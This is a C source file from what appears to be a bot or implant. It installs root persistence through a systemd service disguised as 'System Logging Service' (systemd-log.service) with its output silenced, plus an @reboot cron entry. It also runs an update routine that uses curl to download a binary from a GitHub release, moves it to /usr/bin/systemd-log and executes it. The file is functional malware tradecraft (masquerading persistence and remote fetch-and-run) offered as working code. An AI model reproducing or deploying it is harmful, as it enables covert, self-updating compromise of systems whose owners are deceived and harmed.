#include "bot.h"

void install_persistence(const char *path)
{
    char svc[1024];
    snprintf(svc, sizeof(svc),
             "[Unit]\nDescription=System Logging Service\nAfter=network.target\n\n"
             "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=10\n"
             "User=root\nWorkingDirectory=/\nStandardOutput=null\nStandardError=null\n\n"
             "[Install]\nWantedBy=multi-user.target\n",
             path);
    FILE *f = fopen("/etc/systemd/system/systemd-log.service", "w");
    if (f) { fwrite(svc, 1, strlen(svc), f); fclose(f); }
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable systemd-log.service 2>/dev/null");
    system("systemctl start systemd-log.service 2>/dev/null");
    char cron[512];
    snprintf(cron, sizeof(cron), "@reboot %s >/dev/null 2>&1\n", path);
    f = fopen("/etc/cron.d/system-log", "w");
    if (f) { fwrite(cron, 1, strlen(cron), f); fclose(f); }
    system("chmod 644 /etc/cron.d/system-log 2>/dev/null");
}

void check_updates(const char *ver)
{
    const char *token = getenv("GITHUB_TOKEN");
    char cmd[1024];
    if (token)
        snprintf(cmd, sizeof(cmd),
                 "curl -s -H \"Authorization: token %s\" \"https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest\" 2>/dev/null"
                 " | sed -n 's/.*\"tag_name\"[^0-9]*\"\\([^\"]*\\)\".*/\\1/p'",
                 token);
    else
        snprintf(cmd, sizeof(cmd),
                 "curl -s \"https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest\" 2>/dev/null"
                 " | sed -n 's/.*\"tag_name\"[^0-9]*\"\\([^\"]*\\)\".*/\\1/p'");
    FILE *p = popen(cmd, "r");
    if (!p) return;
    char latest[64] = {0};
    fread(latest, 1, sizeof(latest) - 1, p);
    pclose(p);
    latest[strcspn(latest, "\n")] = 0;
    if (latest[0] && strcmp(latest, ver) != 0) {
        token = getenv("GITHUB_TOKEN");
        if (token)
            snprintf(cmd, sizeof(cmd),
                     "curl -sL -H \"Authorization: token %s\" \"https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static\""
                     " -o /tmp/bot_update && chmod +x /tmp/bot_update &&"
                     " mv /tmp/bot_update /usr/bin/systemd-log && /usr/bin/systemd-log &",
                     token, latest);
        else
            snprintf(cmd, sizeof(cmd),
                     "curl -sL \"https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static\""
                     " -o /tmp/bot_update && chmod +x /tmp/bot_update &&"
                     " mv /tmp/bot_update /usr/bin/systemd-log && /usr/bin/systemd-log &",
                     latest);
        system(cmd);
        exit(0);
    }
}
